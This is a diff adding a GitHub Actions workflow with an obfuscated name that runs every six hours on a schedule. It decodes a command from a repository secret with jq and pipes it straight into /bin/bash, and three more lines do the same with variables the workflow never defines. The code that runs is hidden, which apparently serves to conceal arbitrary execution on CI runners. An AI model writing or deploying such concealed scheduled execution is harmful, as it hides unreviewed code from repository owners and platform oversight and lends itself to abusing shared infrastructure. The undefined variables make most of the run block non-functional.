@@ -1,0 +1,21 @@
+name: nagexianshipingyigeneng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nagexianshipingyigeneng
+        env:
+          igda35: ${{ secrets.igda35 }}
+        run: |
+          echo $igda35 | jq -r .wffxg73 | /bin/bash
+          echo $hy58054 | jq -r .fi77054 | /bin/bash
+          echo $y547 | jq -r .ezgp02 | /bin/bash
+          echo $s98087 | jq -r .asltv7 | /bin/bash
+
